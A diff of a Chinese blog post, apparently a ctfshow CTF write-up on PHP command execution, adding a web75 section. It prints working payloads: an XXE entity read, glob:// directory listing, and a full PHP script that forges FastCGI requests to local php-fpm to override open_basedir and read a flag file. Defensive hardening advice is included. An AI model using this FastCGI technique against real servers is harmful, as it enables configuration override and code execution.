@@ -1,7 +1,7 @@
 ---
 title: "ctfshow-WEB入门（命令执行）第二篇"
 description: "ctfshow-WEB入门（命令执行）第二篇"
-image: "/assets/西施2.jpg"
+image: "/assets/不属于这个时代的愚者.jpg"
 date: 2026-11-08
 updated: 2026-11-08
 categories:
@@ -18,15 +18,12 @@ type: tech
 
 ::link-banner
 ---
-banner: /assets/西施，冰雪.jpg
-title: ctfshow-WEB入门（命令执行）第二篇
-description: 题目来源:ctfshow的WEB入门题
-link: "https://ctf.show/challenges"
+banner: /assets/西施，鸟.jpg
+title: 上一篇
+description: ctfshow-WEB入门（命令执行）第一篇
+link: "https://blog.qianbenyuan.dpdns.org/2026/ctfshow-web-command-exec-1"
 ---
 ::
-
-
-**上一篇**：[ctfshow-WEB入门（命令执行）第一篇](/2026/ctfshow-web-command-exec-1)
 
 ---
 
@@ -1341,10 +1338,6 @@ c=ob_end_flush();include('/flagc.txt');
 - 文件名不确定 → `scandir('/')` 先列目录
 - 没有 `open_basedir` 才读得到根目录（web72 有，所以 web72 才要上 UAF）
 
-
-
-
-
 ### web74
 
 **同一套代码，但黑名单更狠：连 `scandir`、`var_dump` 都禁了**
@@ -1421,3 +1414,135 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 3. **类和类方法**：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口
 
 企业加固视角：只靠 `disable_functions` 必然漏，必须叠加 `open_basedir`、Web 进程最小权限、容器/沙箱隔离，并把上传目录设为不可执行。这题把"黑名单的边界在哪"演示得非常清楚，建议记住这三类绕过。
+
+### web75
+
+![image-20261108124648010](/assets/ctfshow-web-command-exec/image-20261108124648010.png)
+
+**open_basedir 回来了：PHP 层的读取全部封死，最后靠 PHP-FPM 协议破局**
+
+源码还是那一套（`eval($c)` + `preg_replace` 打码），`disable_functions` 和 web74 同样 95 项。真正的变化是 `ini_get('open_basedir')`：
+
+```
+/var/www/html/
+```
+
+也就是说，PHP 脚本能碰的文件只剩站点目录。而 `/var/www/html` 里只有两个文件：
+
+- `index.php`（题目本体）
+- `flag.php` —— **假旗**，内容是 `$flag="秀秀得了,这次不在这里";`
+
+`getenv()` 里还有一个名为 `not_flag` 的环境变量，同样是诱饵。真 flag 在根目录：`/flag36.txt`（用 `DirectoryIterator('glob:///*')` 能看见名字）。
+
+#### 一、先把"不行的路"全部走一遍（这张表就是本题的价值）
+
+| 尝试 | 结果 |
+|---|---|
+| `include('/flag36.txt')` | `open_basedir restriction in effect` |
+| `new SplFileObject('/flag36.txt')` | `open_basedir restriction` |
+| `glob('/*')` | 只匹配到字面量 `/`，通配符不生效 |
+| `opendir('/')` / `readdir()` | `open_basedir restriction` |
+| `gzfile()` / `php_strip_whitespace()` / `stat()` / `md5_file()` / `getimagesize()` | 全部被拦 |
+| `php://filter/resource=/flag36.txt` | 被拦 |
+| `/proc/self/root/flag36.txt` | 被拦 |
+| `/var/www/html/../../flag36.txt` | 被拦（按真实路径归一化后比较） |
+| `chdir('/')` 之后用相对路径 | 被拦 |
+| XXE：`DOMDocument` + `<!ENTITY f SYSTEM "file:///flag36.txt">` | 失败，报 `Entity 'f' not defined` |
+| `new SQLite3('/flag36.txt')` | `open_basedir prohibits opening` |
+| `PharData` / `XMLReader` / `finfo_file` | 全部失败 |
+
+两个值得记住的细节：
+
+- **XXE 为什么也不行**：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
+- **`glob('/*')` 返回 1**：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
+
+#### 二、唯一活着的口子：`glob://` 能列目录
+
+```
+c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}
+```
+
+输出：
+
+```
+bin|dev|etc|flag36.txt|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var|
+```
+
+`glob://` 包装器不受 open_basedir 限制，所以能拿到名字。但注意：**它只能列名字**——拿到的 `SplFileInfo` 再调 `openFile()` 读内容时，open_basedir 检查又回来了（实测 `File(//flag36.txt) is not within the allowed path(s)`）。所以别指望 `glob://` 直接读出内容。
+
+#### 三、正解：PHP-FPM 的 FastCGI 协议，自己给自己发请求
+
+先看两个条件：
+
+1. 环境是 php-fpm（`getenv()` 里能看到 `--enable-fpm`、`HOME=/home/www-data`），`127.0.0.1:9000` 是它的监听端口；
+2. `fsockopen` 被禁了，**但 `stream_socket_client` 没被禁**，`stream_socket_client('tcp://127.0.0.1:9000')` 实测能连上。
+
+原理：php-fpm 用 FastCGI 协议和 Web 服务器通信，请求里的 `PHP_VALUE` / `PHP_ADMIN_VALUE` 参数会在**脚本执行之前**修改 php.ini 设置。于是我们自己构造一个 FastCGI 请求发给 FPM，让它执行 `index.php`，同时把 `open_basedir` 改成 `/`，再在 POST 的 `c` 里放 `include('/flag36.txt')`——这时候 open_basedir 已经是根目录，文件就读出来了。
+
+payload（省掉了注释和调试输出）：
+
+```php
+ob_end_flush();
+// FastCGI 记录：8 字节头 + 内容 + 按 8 字节对齐的填充
+function rc($type,$content){
+    $l=mb_strlen($content,'8bit');
+    $pad=(8-$l%8)%8;
+    return pack('CCnnCC',1,$type,1,$l,$pad,0).$content.str_repeat("\0",$pad);
+}
+// name-value pair：长度 <128 用 1 字节，否则 4 字节大端且最高位置 1
+function nv($n,$v){
+    $e=function($l){return $l<128?pack('C',$l):pack('N',$l|0x80000000);};
+    return $e(mb_strlen($n,'8bit')).$e(mb_strlen($v,'8bit')).$n.$v;
+}
+
+$body='c='.urlencode("ob_end_flush();include('/flag36.txt');");
+
+$params = nv('SCRIPT_FILENAME','/var/www/html/index.php')
+        . nv('REQUEST_METHOD','POST')
+        . nv('CONTENT_TYPE','application/x-www-form-urlencoded')
+        . nv('CONTENT_LENGTH',''.mb_strlen($body,'8bit'))
+        . nv('PHP_VALUE','open_basedir=/');
+
+$req = rc(1,pack('nC',1,0).str_repeat("\0",5))   // BEGIN_REQUEST：role=1(响应者)+flags+5字节保留
+     . rc(4,$params).rc(4,'')                     // PARAMS，空记录结尾
+     . rc(5,$body).rc(5,'');                      // STDIN，空记录结尾
+
+$s=stream_socket_client('tcp://127.0.0.1:9000',$en,$es,5);
+stream_set_timeout($s,5);
+stream_socket_sendto($s,$req);
+$resp=stream_get_contents($s);
+preg_match('/ctfshow\{[^}]*\}/',$resp,$m);
+echo $m[0];
+```
+
+几个协议细节：
+
+- 记录头固定 8 字节：版本(1) + 类型(1) + requestId(2) + 内容长度(2) + 填充长度(1) + 保留(1)，对应 `pack('CCnnCC',...)`
+- 类型：`1`=BEGIN_REQUEST、`4`=PARAMS、`5`=STDIN
+- BEGIN_REQUEST 的内容固定 8 字节：role(2) + flags(1) + 5 字节保留，role=1 表示"响应者"
+- PARAMS 和 STDIN 都以一条**空记录**结束
+- 读响应不用 `fread`（被禁），用 `stream_get_contents` 一次读完
+
+实测 `PHP_VALUE` 单独就能改 `open_basedir`（它是 `PHP_INI_ALL` 级别），换成 `PHP_ADMIN_VALUE` 也可以。
+
+#### 四、两个坑
+
+**1. `disable_functions` 清不掉**
+
+有的人会想在 `PHP_ADMIN_VALUE` 里写 `disable_functions=`，让 `system()` 复活。实测**不行**：`system()` 仍然报 `has been disabled`。原因是"禁用函数表"在 PHP 启动（module init）阶段就已经注册好了，请求阶段再改 ini 不会重新启用函数。所以别绕远路，直接用 `include`（语言构造，黑名单禁不掉）读文件。
+
+**2. 改过的 ini 会残留在 FPM worker 里**
+
+实测发完 `open_basedir=/` 的 FastCGI 请求后，**后续普通请求**的 `ini_get('open_basedir')` 也变成了 `/`，也就是这个 worker 被"污染"了。做题时这会让后面的对照实验失真（我一开始就被骗了一次：以为 `SplFileObject` 和 `glob` 突然能用了，其实是 open_basedir 已经被改成 `/`）。要恢复就再发一个 `open_basedir=/var/www/html/` 的 FastCGI 请求。
+
+#### 五、为什么值得学
+
+1. **这是真实世界的高危配置**：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
+2. **看清 `open_basedir` + `disable_functions` 的边界**：它们只是 PHP 解释器层的约束，一旦能改 ini、换执行环境（FPM/CGI/CLI）就形同虚设。
+3. **防守视角**：FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离，不要让它对内网裸奔。
+
+#### 对照小结
+
+- PHP 层能想到的读法（include / SPL / 伪协议 / XXE / SQLite / Phar）在这题全被封死
+- `glob://` 只能列目录，不能读内容
+- 真正破局的是**换一层**：用 FastCGI 协议让 FPM 在新的 ini 配置下重新执行脚本
